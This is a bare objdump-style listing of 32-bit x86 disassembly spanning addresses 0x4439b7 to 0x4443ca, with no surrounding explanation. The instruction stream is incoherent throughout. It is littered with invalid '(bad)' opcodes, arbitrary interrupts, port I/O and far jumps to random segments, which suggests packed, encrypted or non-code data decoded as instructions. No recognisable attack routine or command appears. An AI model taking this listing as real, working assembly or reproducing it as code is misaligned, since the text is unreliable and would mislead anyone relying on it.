  4439b7:	push   DWORD PTR [edi+0x5b00fbe1]
  4439bd:	sbb    BYTE PTR [ecx],bh
  4439bf:	add    al,0x24
  4439c1:	cld    
  4439c2:	push   es
  4439c3:	mov    dh,0x36
  4439c5:	arpl   WORD PTR [ebp-0x4],ax
  4439c8:	scas   eax,DWORD PTR es:[edi]
  4439c9:	push   edx
  4439ca:	retf   
  4439cb:	loopne 0x4439cd
	...
  4439e9:	add    dh,ah
  4439eb:	jle    0x4439ab
  4439ed:	or     BYTE PTR [ebp-0x33fc07b7],bl
  4439f3:	test   al,0x70
  4439f5:	dec    eax
  4439f6:	es mov esi,0x242c4f83
  4439fc:	stc    
  4439fd:	jmp    esp
  4439ff:	add    ecx,ebx
  443a01:	loopne 0x4439c2
  443a03:	push   edx
  443a04:	dec    eax
  443a05:	and    esi,DWORD PTR [edi+0x77403f02]
  443a0b:	js     0x443a06
  443a0d:	mov    fs,WORD PTR [eax]
  443a0f:	or     BYTE PTR [eax],al
  443a11:	add    BYTE PTR [edi],bh
  443a13:	int3   
  443a14:	aas    
  443a15:	mov    DWORD PTR ds:0xd15b51e,ecx
  443a1b:	test   eax,0xa91b01bc
  443a20:	std    
  443a21:	call   DWORD PTR [esi+0xcb84566]
  443a27:	test   eax,0x49befffd
  443a2c:	xor    eax,0xb512ce1d
  443a31:	test   edx,edx
  443a33:	pop    eax
  443a34:	js     0x443a3a
  443a36:	xchg   ebp,eax
  443a37:	and    dh,BYTE PTR [ebp-0xb5e9b41]
  443a3d:	mov    cl,0x44
  443a3f:	adc    BYTE PTR [edx],bh
  443a41:	hlt    
  443a42:	es out 0x2a,eax
  443a45:	inc    eax
  443a46:	jge    0x443a72
  443a48:	and    bh,ah
  443a4a:	or     eax,0xcf79b6
	...
  443a6b:	add    BYTE PTR [esi],cl
  443a6d:	test   eax,0xab8308fd
  443a72:	sahf   
  443a73:	dec    ebx
  443a74:	inc    ecx
  443a75:	and    cl,dh
  443a77:	int    0x2d
  443a79:	and    cl,BYTE PTR [ebp+0x58]
  443a7c:	iret   
  443a7d:	sub    esi,eax
  443a7f:	or     BYTE PTR [esi],cl
  443a81:	popa   
  443a82:	pop    esp
  443a83:	jmp    DWORD PTR [edx]
  443a85:	test   eax,0x222dccfd
  443a8a:	dec    ebp
  443a8b:	push   eax
  443a8c:	test   ah,dl
  443a8e:	fwait
  443a8f:	dec    eax
  443a90:	cs push 0xffffff89
  443a93:	add    al,0x8c
  443a95:	and    esp,ecx
  443a97:	mov    edi,0xb20ea0e4
  443a9c:	les    ecx,FWORD PTR [edi]
  443a9e:	inc    edi
  443a9f:	hlt    
  443aa0:	es addr16 adc eax,0xd18b5bf
  443aa7:	sbb    DWORD PTR [ebp-0x79000258],0xffffffff
  443aae:	lds    esi,FWORD PTR cs:[edx-0x26ae8ff9]
  443ab5:	push   es
  443ab6:	cdq    
  443ab7:	int    0x92
  443ab9:	inc    esp
  443aba:	inc    ebx
  443abb:	adc    edi,DWORD PTR [edi-0x39]
  443abe:	out    0x50,al
  443ac0:	mov    cl,0x88
  443ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443ac3:	mov    edi,0x3e70065
  443ac8:	or     eax,0x468f47b3
  443acd:	pushf  
  443ace:	scas   eax,DWORD PTR es:[edi]
  443acf:	out    0x0,al
	...
  443aed:	add    cl,cl
  443aef:	mov    dl,0xf
  443af1:	(bad)  
  443af2:	(bad)  
  443af3:	mov    ebp,DWORD PTR [eax]
  443af5:	lods   eax,DWORD PTR ds:[esi]
  443af6:	sbb    eax,0x458f2803
  443afb:	mov    ch,BYTE PTR [edx+0x6efb9033]
  443b01:	adc    ebx,DWORD PTR [edi-0x3172e4bc]
  443b07:	mov    ebp,DWORD PTR [eax]
  443b09:	lods   al,BYTE PTR ds:[esi]
  443b0a:	add    eax,0x48c39907
  443b0f:	mov    edi,0x2dbfca1e
  443b14:	data16 and BYTE PTR [ecx],bh
  443b17:	(bad)  
  443b18:	fld    DWORD PTR [edi+0x3e702f2]
  443b1e:	adc    al,0x4e
  443b20:	in     eax,0x8e
  443b22:	push   edi
  443b23:	mov    dl,0xc7
  443b25:	mov    es,esi
  443b27:	mov    bl,0xaa
  443b29:	push   eax
  443b2a:	adc    DWORD PTR [ecx-0x1a],eax
  443b2d:	mov    ebx,0x8ca44e14
  443b32:	dec    esi
  443b33:	pushf  
  443b34:	loop   0x443b8f
  443b36:	rol    BYTE PTR [ecx],cl
  443b38:	lahf   
  443b39:	pop    ebx
  443b3a:	repnz xchg ebp,eax
  443b3c:	out    0x3,eax
  443b3e:	fsub   DWORD PTR [eax-0x7e16af92]
  443b44:	add    BYTE PTR [edi+0x71537d06],ch
  443b4a:	inc    esi
  443b4b:	repz mov esp,0xb107763a
  443b51:	lods   al,BYTE PTR ds:[esi]
	...
  443b6e:	add    BYTE PTR [eax],al
  443b70:	int3   
  443b71:	xchg   ebx,eax
  443b72:	shl    BYTE PTR [edx+0x5f],0x30
  443b76:	test   ebp,esp
  443b78:	mov    DWORD PTR [ebp+0x43],edi
  443b7b:	cmp    eax,0xee08a8d1
  443b80:	inc    esp
  443b81:	sar    ch,0xab
  443b84:	jb     0x443b51
  443b86:	shl    DWORD PTR [esi-0x4b4df8e0],0x4d
  443b8d:	jnp    0x443bd2
  443b8f:	adc    eax,0x18259bbb
  443b94:	adc    DWORD PTR [edi+0xef2c4],eax
  443b9a:	test   DWORD PTR [ecx],esi
  443b9c:	push   ecx
  443b9d:	popf   
  443b9e:	or     dh,ch
  443ba0:	les    edi,FWORD PTR [edi+edi*8-0x14ad9b]
  443ba7:	call   0xd869d747
  443bac:	xchg   esi,eax
  443bad:	dec    ecx
  443bae:	in     al,0x91
  443bb0:	leave  
  443bb1:	or     ecx,DWORD PTR [ecx]
  443bb3:	(bad)
  443bb8:	xor    eax,ebp
  443bba:	jno    0x443be5
  443bbc:	adc    DWORD PTR [ebp+0xeeb58],ebx
  443bc2:	test   DWORD PTR [ecx-0x573fae04],esp
  443bc8:	data16 lock jl 0x443b55
  443bcc:	sbb    al,0x7d
  443bce:	dec    ecx
  443bcf:	and    eax,0xae483e96
	...
  443bf0:	add    BYTE PTR [eax],al
  443bf2:	add    al,0xef
  443bf4:	(bad)  
  443bf5:	call   0x85b708
  443bfa:	sbb    al,0x7d
  443bfc:	shl    BYTE PTR [esp+esi*1-0x4d],0xe9
  443c01:	jae    0x443bc9
  443c03:	jnp    0x443c7a
  443c05:	cld    
  443c06:	in     al,0xef
  443c08:	adc    DWORD PTR [eax+0xf0000b6],0xffffff9a
  443c0f:	std    
  443c10:	test   BYTE PTR [ebp+0x60],0x83
  443c14:	(bad)  
  443c15:	rol    DWORD PTR [esi+edi*1+0x7b],cl
  443c19:	(bad)  
  443c1a:	pushf  
  443c1b:	mov    DWORD PTR [ebp-0x8],ecx
  443c1e:	mov    bh,0x58
  443c20:	xor    esi,DWORD PTR [edi+0x6c]
  443c23:	jmp    0x1b8:0x48738bd5
  443c2a:	je     0x443c2c
  443c2c:	add    bl,dl
  443c2e:	adc    al,0xa3
  443c30:	jmp    0xa846:0xf9bb4748
  443c37:	dec    ebx
  443c38:	jecxz  0x443c3b
  443c3a:	jecxz  0x443c03
  443c3c:	adc    eax,DWORD PTR [eax]
  443c3e:	je     0x443c07
  443c40:	call   DWORD PTR [edi]
  443c42:	add    BYTE PTR fs:[eax],al
  443c45:	and    ecx,0x70
  443c48:	add    BYTE PTR [edi],cl
  443c4a:	mov    eax,0x34fffa2e
  443c4f:	add    DWORD PTR [ebp-0x20],0xf
  443c53:	inc    ebp
  443c54:	lock mov eax,DWORD PTR [eax]
	...
  443c73:	add    bl,ch
  443c75:	inc    edi
  443c76:	xor    eax,ecx
  443c78:	jmp    0xf43d:0x9dc12348
  443c7f:	cmp    ebp,ebx
  443c81:	(bad)  
  443c82:	outs   dx,DWORD PTR ds:[esi]
  443c83:	or     eax,0x1bc01fa7
  443c88:	hlt    
  443c89:	(bad)  
  443c8a:	dec    DWORD PTR [esi]
  443c8c:	imul   esi,DWORD PTR [ebx],0xa90dfff9
  443c92:	mov    WORD PTR [ecx+0x3d],cs
  443c95:	scas   al,BYTE PTR es:[edi]
  443c96:	mov    esi,0xbeae1a72
  443c9b:	test   DWORD PTR [edx+0x4d],edx
  443c9e:	add    al,0x49
  443ca0:	and    eax,0x26f44220
  443ca5:	popa   
  443ca6:	lods   al,BYTE PTR ds:[esi]
  443ca7:	add    eax,0x24d14a96
  443cac:	aad    0xa6
  443cae:	push   eax
  443caf:	xor    BYTE PTR [esi+0x40879164],al
  443cb5:	int    0x8b
  443cb7:	dec    ecx
  443cb8:	dec    ebp
  443cb9:	adc    BYTE PTR [edx-0x24],cl
  443cbc:	out    0xe7,al
  443cbe:	push   ss
  443cbf:	adc    eax,DWORD PTR [esi-0x79f55418]
  443cc5:	je     0x443c6c
  443cc7:	and    eax,0x40480e55
  443ccc:	xchg   esp,eax
  443ccd:	fs mov cl,0x87
  443cd0:	ror    ah,1
  443cd2:	test   DWORD PTR [ebx+0x79],eax
  443cd5:	push   ds
  443cd6:	dec    edx
  443cd7:	lock add BYTE PTR [eax],al
	...
  443cf6:	es call 0xe8da4012
  443cfc:	test   DWORD PTR [ebx+0x61],eax
  443cff:	mov    esi,0x98c087c5
  443d04:	test   DWORD PTR [ebx+0x69],ecx
  443d07:	out    dx,al
  443d08:	retf   
  443d09:	test   eax,ecx
  443d0b:	mov    al,0x8b
  443d0d:	dec    ecx
  443d0e:	int    0x1d
  443d10:	dec    edi
  443d11:	aam    0xe6
  443d13:	rep stos DWORD PTR es:[edi],eax
  443d15:	xchg   eax,ebx
  443d17:	je     0x443cbe
  443d19:	or     BYTE PTR [esi],dh
  443d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443d1c:	nop
  443d1d:	inc    edi
  443d1e:	or     eax,0x87d44f1e
  443d23:	mov    ch,0x4
  443d25:	test   DWORD PTR [eax+0x0],edx
  443d28:	(bad)  
  443d29:	mov    WORD PTR ds:0x1519a40,ss
  443d2f:	mov    DWORD PTR [esp+ebp*4],ebp
  443d32:	jle    0x443cd8
  443d34:	popw   ds
  443d36:	dec    ebp
  443d37:	add    dl,dh
  443d39:	mov    BYTE PTR [ecx+eax*1],ah
  443d3c:	out    0x3,eax
  443d3e:	int3   
  443d3f:	cli    
  443d40:	fiadd  DWORD PTR [ebx]
  443d42:	or     eax,0xcbd88000
  443d47:	xchg   edx,eax
  443d48:	out    0x82,eax
  443d4a:	inc    esi
  443d4b:	nop
  443d4c:	out    0xe,eax
  443d4e:	xchg   ecx,eax
  443d4f:	xchg   eax,ebp
  443d51:	add    ecx,DWORD PTR ds:0x93aba487
  443d57:	inc    edx
  443d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443d59:	mov    eax,DWORD PTR [eax]
	...
  443d77:	add    BYTE PTR ds:0x9d513a40,dl
  443d7d:	mov    BYTE PTR [ebx+ebp*4+0x3d2facc],ch
  443d84:	or     eax,0x83f41000
  443d89:	xchg   edx,eax
  443d8a:	out    0x82,eax
  443d8c:	hlt    
  443d8d:	pop    es
  443d8e:	out    0xe,eax
  443d90:	mov    DWORD PTR [edi-0x19],ecx
  443d93:	add    ecx,DWORD PTR ds:0xf1e4017f
  443d99:	fldcw  WORD PTR [ebx+0x28]
  443d9c:	xor    DWORD PTR [eax],eax
  443d9e:	and    WORD PTR [ecx-0x1],dx
  443da2:	fld    DWORD PTR [edi+0x3e700da]
  443da8:	adc    al,0x4a
  443daa:	in     eax,0x9e
  443dac:	(bad)  
  443dad:	xchg   ebx,eax
  443dae:	pop    esi
  443daf:	int    0x40
  443db1:	lahf   
  443db2:	and    eax,0x70074f83
  443db7:	cmp    BYTE PTR ds:0x17829efe,ah
  443dbd:	(bad)  
  443dbf:	cmp    dl,BYTE PTR [ebx+0x7c]
  443dc2:	inc    ebx
  443dc3:	leave  
  443dc4:	idiv   DWORD PTR [esi]
  443dc6:	lock jb 0x443e26
  443dc9:	or     bh,bh
  443dcb:	daa    
  443dcc:	cmc    
  443dcd:	xchg   edx,eax
  443dce:	inc    edx
  443dcf:	cmc    
  443dd0:	cmp    DWORD PTR ds:0xcce64e0,0xa83d7227
  443dda:	test   DWORD PTR [esi],edx
	...
  443df8:	add    BYTE PTR [eax],al
  443dfa:	fld    DWORD PTR [ecx+0x25]
  443dfd:	mov    eax,ds:0xe910178f
  443e02:	add    DWORD PTR [edx+0x74],eax
  443e05:	out    dx,al
  443e06:	jbe    0x443dca
  443e08:	add    ch,cl
  443e0a:	push   cs
  443e0b:	fwait
  443e0c:	add    eax,DWORD PTR [ecx+0x57]
  443e0f:	idiv   bh
  443e11:	call   0x724c83ad
  443e16:	in     eax,0x97
  443e18:	xchg   DWORD PTR [esi-0x6c0856a],esp
  443e1e:	(bad)  
  443e1f:	pop    ss
  443e20:	adc    cl,ch
  443e22:	xchg   edi,eax
  443e23:	cmp    eax,0x9fd570f0
  443e28:	test   DWORD PTR [edx],ebp
  443e2a:	adc    eax,0x93e922f3
  443e2f:	add    BYTE PTR [eax],al
  443e31:	bound  edx,QWORD PTR [edi+0x51]
  443e34:	(bad)  
  443e36:	sqrtps xmm0,XMMWORD PTR [ebp+0x8995132]
  443e3d:	push   0xe9f900a9
  443e42:	push   cs
  443e43:	push   ecx
  443e44:	loopne 0x443e37
  443e46:	or     eax,0x4eb28551
  443e4b:	cdq    
  443e4c:	sbb    dl,ch
  443e4e:	dec    edi
  443e4f:	retf   
  443e50:	inc    eax
  443e51:	icebp  
  443e52:	add    al,BYTE PTR [eax*4-0x40fc0f00]
  443e59:	inc    eax
  443e5a:	sub    al,0xa4
  443e5c:	outs   dx,DWORD PTR ds:[esi]
  443e5d:	inc    eax
	...
  443e7a:	add    BYTE PTR [eax],al
  443e7c:	and    al,0x68
  443e7e:	push   esp
  443e7f:	xor    ebx,DWORD PTR [edi-0xc381052]
  443e85:	xchg   edi,eax
  443e86:	stc    
  443e87:	jmp    esp
  443e89:	jg     0x443f02
  443e8b:	or     ah,ah
  443e8d:	add    eax,DWORD PTR [esi+ecx*4-0x7d00030c]
  443e94:	or     ecx,DWORD PTR [ecx+edi*8+0x88700e]
  443e9b:	add    ah,ah
  443e9d:	jg     0x443e95
  443e9f:	and    bh,al
  443ea1:	sahf   
  443ea2:	jl     0x443f21
  443ea4:	sub    ah,bh
  443ea6:	push   es
  443ea7:	test   BYTE PTR [edi],bh
  443ea9:	cld    
  443eaa:	(bad)  
  443eab:	jmp    FWORD PTR [ebx-0x760105d6]
  443eb1:	jo     0x443e36
  443eb3:	into   
  443eb4:	pop    es
  443eb5:	pop    esp
  443eb6:	cmp    al,BYTE PTR [ebx+0x558103f2]
  443ebc:	fdiv   st(6),st
  443ebe:	xlat   BYTE PTR ds:[ebx]
  443ebf:	cmp    DWORD PTR [edx],0xffffff9c
  443ec2:	imul   ebx,esi,0x6f
  443ec5:	rcr    DWORD PTR [ebx],cl
  443ec7:	je     0x443e89
  443ec9:	xchg   DWORD PTR [ebp+0x8],eax
  443ecc:	and    edi,DWORD PTR ds:0x3c822f18
  443ed2:	add    bh,al
  443ed4:	jae    0x443e67
  443ed6:	stc    
  443ed7:	jmp    DWORD PTR [edi+eax*4-0x1]
  443edb:	sbb    BYTE PTR [edx+edx*4+0x8],0x86
	...
  443efc:	add    BYTE PTR [eax],al
  443efe:	push   esp
  443eff:	(bad)  
  443f00:	idiv   edi
  443f02:	ins    BYTE PTR es:[edi],dx
  443f03:	jb     0x443efc
  443f05:	call   FWORD PTR [ebx-0x2e]
  443f08:	push   edx
  443f09:	pop    edi
  443f0a:	or     eax,0x4f5ba21e
  443f0f:	sahf   
  443f10:	std    
  443f11:	test   al,cl
  443f13:	mov    cs,WORD PTR [eax+0x450f254b]
  443f19:	or     al,0x86
  443f1b:	fist   DWORD PTR [ebx+0x32221d87]
  443f21:	cld    
  443f22:	xchg   esp,eax
  443f23:	shl    ebx,1
  443f25:	xchg   BYTE PTR [ebp-0x5b],bl
  443f28:	xchg   BYTE PTR [ecx+0x31],dh
  443f2b:	xlat   BYTE PTR ds:[ebx]
  443f2c:	test   BYTE PTR [ecx+0x25],bl
  443f2f:	rcr    BYTE PTR [ebx-0x2],cl
  443f32:	loop   0x443ecd
  443f34:	std    
  443f35:	pop    eax
  443f36:	xchg   BYTE PTR [edx+edi*1-0x2f66fa42],al
  443f3d:	aam    0xfe
  443f3f:	push   ss
  443f40:	les    eax,FWORD PTR [ecx]
  443f42:	and    DWORD PTR [ecx+0x64d2fffd],ebx
  443f48:	mov    ch,0xff
  443f4a:	mov    dl,0x99
  443f4c:	std    
  443f4d:	in     al,0x12
  443f4f:	out    0x41,al
  443f51:	fsub   DWORD PTR [eax-0x790663ba]
  443f57:	fs add eax,0x86414085
  443f5d:	dec    eax
  443f5e:	sbb    DWORD PTR [edx],esp
  443f60:	dec    edx
  443f61:	lock add BYTE PTR [eax],al
	...
  443f80:	xchg   esp,eax
  443f81:	mov    DWORD PTR [eax+0x45107953],ecx
  443f87:	adc    BYTE PTR [ecx+ecx*2-0x3f1582ff],al
  443f8e:	std    
  443f8f:	xchg   dl,al
  443f91:	rol    BYTE PTR [esi-0x8ebe68f],0x84
  443f98:	sar    al,0xd7
  443f9b:	inc    edi
  443f9c:	sbb    eax,0xa84d215
  443fa1:	add    BYTE PTR [esi-0x64],ah
  443fa4:	push   ss
  443fa5:	or     eax,0xea358709
  443faa:	push   edx
  443fab:	add    ch,BYTE PTR [eax-0x610024f4]
  443fb1:	loop   0x444020
  443fb3:	inc    ecx
  443fb4:	sub    eax,0x250c1c7b
  443fb9:	std    
  443fba:	ret    0x49b
  443fbd:	test   DWORD PTR [edi-0x1538e6f0],esp
  443fc3:	stc    
  443fc4:	cli    
  443fc5:	mov    fs,edi
  443fc7:	cmp    DWORD PTR [eax+0x48],ebx
  443fca:	xchg   ebx,eax
  443fcb:	fwait
  443fcc:	in     al,0x8e
  443fce:	sub    cl,BYTE PTR [edi+0xca52cee]
  443fd4:	or     eax,0x880bf47b
  443fd9:	inc    esp
  443fda:	xchg   edi,eax
  443fdb:	out    dx,eax
  443fdc:	dec    esp
  443fdd:	add    al,0x5e
  443fdf:	cmp    DWORD PTR [ebp+0xf3c0da],ebp
	...
  444001:	add    BYTE PTR [ebx+0x5704ef44],bh
  444007:	hlt    
  444008:	out    0x3a,eax
  44400a:	or     DWORD PTR [ebx+0x790d0bca],eax
  444010:	lods   al,BYTE PTR ds:[esi]
  444011:	mov    bl,0x21
  444013:	shl    DWORD PTR [ebx-0x41],1
  444016:	sbb    ebp,ebx
  444018:	sbb    ebx,DWORD PTR gs:0x120f9600
  44401f:	jnp    0x443fda
  444021:	pop    es
  444022:	nop
  444023:	inc    esi
  444024:	(bad)  
  444025:	out    dx,al
  444026:	inc    ecx
  444027:	xor    DWORD PTR [edi-0x18facc55],esi
  44402d:	add    ebp,DWORD PTR [eax-0x2]
  444030:	ins    DWORD PTR es:[edi],dx
  444031:	dec    edx
  444032:	or     DWORD PTR [ebx-0x6e],edi
  444035:	sti    
  444036:	sub    DWORD PTR [ebx-0x67ff6800],edi
  44403c:	pop    es
  44403d:	int3   
  44403e:	push   cs
  44403f:	add    BYTE PTR [edi+0x4285392e],al
  444045:	sbb    DWORD PTR [edx+0x23d17d00],eax
  44404b:	adc    cl,BYTE PTR [esi+eiz*4]
  44404e:	int    0xf7
  444050:	(bad)  
  444051:	call   0xc1c14064
  444056:	add    al,0x13
  444058:	add    DWORD PTR [esi-0x180007b3],ebp
  44405e:	push   cs
  44405f:	add    BYTE PTR [ebp-0x2870f2ca],al
  444065:	add    al,BYTE PTR [eax]
	...
  444083:	add    al,al
  444085:	fcmovne st,st(5)
  444087:	push   0xffffffb1
  444089:	inc    eax
  44408a:	jge    0x44401d
  44408c:	adc    esi,edi
  44408e:	xchg   edx,eax
  44408f:	stos   DWORD PTR es:[edi],eax
  444090:	adc    edi,DWORD PTR [ecx]
  444092:	or     BYTE PTR [ebx],dh
  444094:	mov    BYTE PTR [esi+0xee980],ch
  44409a:	std    
  44409b:	xchg   edi,eax
  44409c:	or     ebp,DWORD PTR [edi]
  44409e:	cmp    al,0x6a
  4440a0:	adc    eax,0xfc7000b0
  4440a5:	(bad)  [edx-0x13]
  4440a8:	lea    esi,[ebx+0x98be774]
  4440ae:	or     al,0xed
  4440b0:	std    
  4440b1:	hlt    
  4440b2:	test   BYTE PTR [esi+edx*2-0x72193f7f],ah
  4440b9:	pop    edi
  4440ba:	cli    
  4440bb:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4440bd:	sub    dl,BYTE PTR [ebp+0x61]
  4440c0:	fwait
  4440c1:	xchg   ecx,edi
  4440c3:	push   ds
  4440c4:	aaa    
  4440c5:	and    ebx,0xffffffb4
  4440c8:	push   eax
  4440c9:	clc    
  4440ca:	jmp    DWORD PTR [ecx-0x33]
  4440cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4440ce:	pop    edx
  4440cf:	add    BYTE PTR [edi+0x71e582ca],ch
  4440d5:	ret    
  4440d6:	or     BYTE PTR [eax],al
  4440d8:	cld    
  4440d9:	idiv   di
  4440dc:	xor    eax,edi
  4440de:	and    ch,0xd1
  4440e1:	lds    ecx,FWORD PTR [eax]
  4440e3:	add    BYTE PTR [ebx+0x3c99],dl
	...
  444105:	add    BYTE PTR [edx-0x62],al
  444108:	cmp    al,0x0
  44410a:	rcr    BYTE PTR [edx-0x5adbffc4],0x3c
  444111:	add    cl,bl
  444113:	xchg   edi,eax
  444114:	cmp    al,0x0
  444116:	(bad)  
  444117:	xchg   edi,eax
  444118:	cmp    al,0x0
  44411a:	mov    BYTE PTR [esp+edi*1+0x3c9a3700],ah
  444121:	add    BYTE PTR [eax+0x75003c99],dl
  444127:	xchg   edi,eax
  444128:	cmp    al,0x0
  44412a:	mov    dl,0x96
  44412c:	cmp    al,0x0
  44412e:	jmp    0xed447de3
  444133:	mov    al,0x3c
  444135:	add    BYTE PTR [ebx+esi*4-0x4e86ffc4],bl
  44413c:	cmp    al,0x0
  44413e:	out    dx,eax
  44413f:	mov    al,0x3c
  444141:	add    BYTE PTR [ebx],bh
  444143:	mov    cl,0x3c
  444145:	add    BYTE PTR [edi+0x55003cb2],ah
  44414b:	mov    dh,0x3c
  44414d:	add    BYTE PTR [edx-0x43],bl
  444150:	cmp    al,0x0
  444152:	push   eax
  444153:	mov    ebp,0xaef2003c
  444158:	cmp    al,0x0
  44415a:	iret   
  44415b:	scas   al,BYTE PTR es:[edi]
  44415c:	cmp    al,0x0
  44415e:	stos   BYTE PTR es:[edi],al
  44415f:	test   eax,0xa8f7003c
  444164:	cmp    al,0x0
  444166:	or     eax,0x3cdb50
	...
  444187:	add    BYTE PTR ds:0xd3cdb7c,cl
  44418d:	(bad)  
  44418e:	fdivr  QWORD PTR [ecx*1+0xd3cdae2]
  444195:	sti    
  444196:	fidivr DWORD PTR [ecx*1+0xd3cd15c]
  44419d:	and    al,0xd4
  44419f:	cmp    al,0xd
  4441a1:	sbb    eax,0x830d3ccd
  4441a6:	int    0x3c
  4441a8:	or     eax,0xd3ccd7c
  4441ad:	push   ebx
  4441ae:	ror    esp,0x41
  4441b1:	pop    edx
  4441b2:	ror    esp,0xd9
  4441b5:	in     al,dx
  4441b6:	mov    ch,ah
  4441b8:	pop    ebx
  4441b9:	push   ds
  4441ba:	or     cl,BYTE PTR [eax]
  4441bc:	nop
  4441bd:	imul   ecx,DWORD PTR [ecx],0x3b
  4441c0:	xchg   bl,ah
  4441c2:	test   DWORD PTR [edx-0x7b321233],0xc77ac553
  4441cc:	popa   
  4441cd:	mov    dl,0x8c
  4441cf:	inc    eax
  4441d0:	sbb    DWORD PTR [edi*4-0x7516e88c],esp
  4441d7:	inc    edx
  4441d8:	cmc    
  4441d9:	call   0xddd31174
  4441de:	add    al,0x85
  4441e0:	inc    ebx
  4441e1:	lea    ecx,[edx+edx*2+0x243f1df5]
  4441e8:	cmp    al,0x47
  4441ea:	cwde   
  4441eb:	rol    BYTE PTR [eax],1
	...
  444209:	add    BYTE PTR [esi+0x4bc104dd],cl
  44420f:	lods   eax,DWORD PTR ds:[esi]
  444210:	std    
  444211:	dec    DWORD PTR ds:0xe3bfd499
  444217:	jnp    0x4441dc
  444219:	add    al,0xd
  44421b:	add    BYTE PTR [edi-0x67],bl
  44421e:	je     0x4441ab
  444220:	sbb    bh,BYTE PTR [ecx]
  444222:	(bad)  
  444223:	mov    ebp,0xbc5103eb
  444228:	sbb    eax,edi
  44422a:	dec    ecx
  44422b:	mov    esp,0xbc41c733
  444230:	sub    eax,edi
  444232:	pop    ecx
  444233:	mov    esp,0x77318c9c
  444238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444239:	or     edx,DWORD PTR [eax-0x46329408]
  44423f:	out    dx,al
  444240:	ins    DWORD PTR es:[edi],dx
  444241:	xor    ebp,edi
  444243:	jbe    0x44426c
  444245:	clc    
  444246:	shl    BYTE PTR [esi+0x34],1
  444249:	or     bl,cl
  44424b:	das    
  44424c:	ret    0x90b5
  44424f:	ret    
  444250:	jmp    0x44428a
  444252:	enter  0x2476,0xf4
  444256:	mov    DWORD PTR [ebx+ebx*8],esi
  444259:	xor    al,0x90
  44425b:	aaa    
  44425c:	add    esi,DWORD PTR [edx]
  44425e:	mov    BYTE PTR [edi],ch
  444260:	(bad)  
  444261:	xor    al,0xe4
  444263:	lods   eax,DWORD PTR ds:[esi]
  444264:	data16 rcl BYTE PTR [ecx],0x2d
  444268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444269:	enter  0xbbc9,0xb3
  44426d:	enter  0x0,0x0
	...
  444289:	add    BYTE PTR [eax],al
  44428b:	add    cl,al
  44428d:	mov    ebx,0xbbd9c8ab
  444292:	sbb    al,0x8b
  444294:	mov    cl,0x76
  444296:	sbb    al,0xc
  444298:	nop
  444299:	inc    eax
  44429a:	test   DWORD PTR [eax-0x7501ec33],0x4d5de83e
  4442a4:	add    DWORD PTR [esi],ebp
  4442a6:	pop    esi
  4442a7:	xor    DWORD PTR [ecx],eax
  4442a9:	outs   dx,BYTE PTR cs:[esi]
  4442ab:	xor    ebp,edi
  4442ad:	sub    eax,0x2e19316e
  4442b2:	add    BYTE PTR [eax+0x257daf9b],bl
  4442b8:	jge    0x4442df
  4442ba:	mov    ebp,0x2cefcc72
  4442bf:	cmp    eax,DWORD PTR [esi+0x4a]
  4442c2:	jae    0x4442b0
  4442c4:	inc    edi
  4442c5:	sub    eax,0xd0d9514
  4442ca:	enter  0x1406,0x4d
  4442ce:	test   DWORD PTR [esi+eax*2+0x3a98853c],edx
  4442d5:	cmp    al,BYTE PTR [ebp-0x7acfed5c]
  4442db:	sub    BYTE PTR [ecx],ah
  4442dd:	cmp    al,0xf9
  4442df:	mov    ecx,0x3410c38f
  4442e4:	dec    esi
  4442e5:	mov    ebx,0xbb529dcc
  4442ea:	int3   
  4442eb:	mov    ch,0x4a
  4442ed:	mov    ebx,0xadcc
	...
  44430e:	sar    BYTE PTR [esp+ecx*8-0x7a6369e4],cl
  444315:	and    al,0x9
  444317:	or     edi,DWORD PTR [eax-0x7]
  44431a:	push   cs
  44431b:	or     DWORD PTR [ebx-0x13],0xffffff97
  44431f:	xor    BYTE PTR [eax+edi*1],bl
  444322:	pop    ds
  444323:	adc    al,0x6
  444325:	bound  ecx,QWORD PTR [esi-0x4]
  444328:	clc    
  444329:	cdq    
  44432a:	pop    esp
  44432c:	or     BYTE PTR [esi+ecx*8],bl
  44432f:	add    DWORD PTR [eax-0x33],0xffffff9b
  444333:	mov    al,0x7d
  444335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444336:	push   es
  444337:	or     edi,eax
  444339:	sbb    ax,0x4ff
  44433d:	sub    DWORD PTR [edi-0x304b063e],ecx
  444343:	fcmovne st,st(5)
  444345:	lods   al,BYTE PTR ds:[esi]
  444346:	iret   
  444347:	mov    esp,0xc0d800cc
  44434c:	int3   
  44434d:	int3   
  44434e:	cmp    cl,al
  444350:	int3   
  444351:	int3   
  444352:	mov    ds:0x14f7ea76,al
  444357:	sub    dh,0x74
  44435a:	inc    ecx
  44435b:	js     0x444301
  44435d:	and    al,0x74
  44435f:	std    
  444360:	(bad)  
  444361:	inc    DWORD PTR [edx]
  444363:	(bad)  
  444364:	sti    
  444365:	jae    0x4443c4
  444367:	add    ch,BYTE PTR [esi+0x794d9711]
  44436d:	loop   0x4443ba
  44436f:	(bad)  
  444370:	(bad)  
  444371:	inc    DWORD PTR [eax]
	...
  44438f:	add    ch,dh
  444391:	push   esp
  444392:	or     BYTE PTR [ebx],dh
  444394:	xor    BYTE PTR [eax],dl
  444396:	test   al,0x22
  444398:	in     al,0x3
  44439a:	cmp    DWORD PTR [esi-0x3f],ecx
  44439d:	pop    ebp
  44439e:	dec    ebx
  44439f:	push   edi
  4443a0:	mov    bh,0x71
  4443a2:	and    BYTE PTR [edi],cl
  4443a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4443a5:	idiv   cl
  4443a7:	jmp    DWORD PTR [eax+edi*2]
  4443aa:	test   cl,0xdb
  4443ad:	mov    BYTE PTR [edi+edi*8-0x2f7d01f9],al
  4443b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4443b5:	push   ebp
  4443b6:	adc    BYTE PTR [ebx+0x8e3bccc],cl
  4443bc:	jne    0x44441d
  4443be:	test   DWORD PTR [eax],0xe278fcf4
  4443c4:	mov    eax,DWORD PTR [ebx]
  4443c6:	add    BYTE PTR [eax],al
  4443c8:	pop    edi
  4443c9:	nop
  4443ca:	mov    gs,WORD PTR [eax+0x33003cd2]
